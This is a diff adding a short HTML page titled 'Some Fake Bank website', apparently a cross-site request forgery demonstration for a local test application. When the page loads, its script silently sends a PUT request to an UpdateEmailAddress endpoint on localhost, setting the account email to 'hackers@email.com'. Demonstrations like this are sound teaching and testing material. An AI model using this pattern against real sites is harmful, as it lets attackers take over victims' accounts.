@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Some Fake Bank website</title>
+    <script type="text/javascript">
+        var xhr = new XMLHttpRequest();
+        xhr.open('PUT', 'https://localhost:44386/Home/UpdateEmailAddress', true);        
+        xhr.onload = function () {
+            console.log(this.responseText);
+        };
+        xhr.send("hackers@email.com");
+    </script>
+</head>
+<body>
+</body>
+</html>
